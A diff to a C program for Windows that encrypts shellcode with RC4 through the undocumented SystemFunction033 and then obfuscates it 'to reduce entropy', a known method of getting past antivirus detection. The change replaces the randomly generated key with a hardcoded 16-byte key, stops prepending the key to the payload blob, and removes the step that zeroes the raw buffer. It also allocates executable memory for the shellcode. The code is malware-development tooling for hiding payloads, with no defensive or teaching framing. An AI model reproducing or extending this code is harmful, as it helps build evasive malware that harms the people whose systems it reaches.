@@ -68,14 +68,6 @@ struct ustring {
 	PVOID Buffer;
 } _data, key, _data2;
 
-// Function to generate random bytes
-VOID GenerateBytes(unsigned char* pBuff, DWORD dwBuffSize) {
-
-	for (size_t i = 0; i < dwBuffSize; i++)
-		pBuff[i] = rand() % 256;
-
-}
-
 // Main Function
 int main(int argc, char* argv[]) {
 
@@ -91,16 +83,8 @@ int main(int argc, char* argv[]) {
 	// Load the SystemFunction033
 	_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction033");
 
-	// Generate the Key
-	BYTE _key[KEY_SIZE];
-	GenerateBytes(_key, KEY_SIZE);
-
-	// Print the Key
-	printf("[i] The Key Bytes: [ ");
-	for (size_t i = 0; i < KEY_SIZE; i++)
-		printf("%02X ", _key[i]);
-	printf("]\n");
-
+	// The Key
+	BYTE _key[KEY_SIZE] = { 0xA7, 0x4E, 0x70, 0x79, 0x01, 0xB0, 0x3D, 0x74, 0x27, 0x3A, 0xED, 0xBD, 0x85, 0xB8, 0xE9, 0xA5 };
 
 	//Original Obfuscation functions.
 	SIZE_T	RawPayloadSize = NULL;
@@ -118,8 +102,6 @@ int main(int argc, char* argv[]) {
 	PVOID ShellcodeBuffer = VirtualAlloc(NULL, RawPayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	// Copy the Payload to the Shellcode Buffer
 	memcpy(ShellcodeBuffer, RawPayloadBuffer, RawPayloadSize);
-	// Clear the Raw Payload Buffer
-	memset(RawPayloadBuffer, 0, RawPayloadSize);
 
 	// Encrypt the Payload
 	key.Buffer = (&_key);
@@ -130,22 +112,13 @@ int main(int argc, char* argv[]) {
 	SystemFunction033(&_data, &key);
 	printf("[+] Payload Encrypted with RC4.\n");
 
-	// Add the Key to the Payload
-	SIZE_T	sNewPayloadSize = (SIZE_T)(RawPayloadSize + KEY_SIZE);
-	PVOID	pNewPayloadData = malloc(sNewPayloadSize);
-	ZeroMemory(pNewPayloadData, sNewPayloadSize);
-
-	memcpy(pNewPayloadData, _key, KEY_SIZE);
-	memcpy((PVOID)((ULONG_PTR)pNewPayloadData + KEY_SIZE), ShellcodeBuffer, RawPayloadSize);
-	printf("[+] Key added to the payload blob.\n");
-
-
+	
 	SIZE_T	ObfuscatedPayloadSize = NULL;
 	PBYTE	ObfuscatedPayloadBuffer = NULL;
 
 	// Obfuscate the Payload
 	printf("[i] Obfuscating Payload to reduce entropy...\n");
-	if (!Obfuscate((PBYTE)pNewPayloadData, sNewPayloadSize, &ObfuscatedPayloadBuffer, &ObfuscatedPayloadSize)) {
+	if (!Obfuscate((PBYTE)ShellcodeBuffer, RawPayloadSize, &ObfuscatedPayloadBuffer, &ObfuscatedPayloadSize)) {
 		return -1;
 	}
 	printf("[+] DONE \n");
